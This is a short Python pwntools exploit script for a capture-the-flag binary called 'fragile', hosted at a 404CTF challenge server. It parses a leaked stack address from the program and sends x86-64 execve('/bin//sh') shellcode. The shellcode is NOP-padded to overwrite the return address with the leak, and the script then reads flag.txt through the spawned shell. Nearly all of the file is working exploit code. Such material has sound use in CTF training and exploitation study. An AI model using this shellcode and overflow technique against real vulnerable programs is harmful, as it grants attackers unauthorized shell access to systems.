#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'info'


exe = ELF('./fragile')

host, port = "challenge.404ctf.fr", "31720"

if args.REMOTE:
  p = remote(host,port)
else:
  p = process(exe.path)

p.recvuntil(': ', drop=True)
leak = int(p.recvuntil('\n', drop=True),16)
print('leak = '+hex(leak))

payload = '\x31\xf6\x56\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xf7\xee\xb0\x3b\x0f\x05'
payload = payload.ljust(0x48,'\x90')
payload += p64(leak)

p.sendline(payload)

p.sendline('cat flag.txt')
p.interactive()

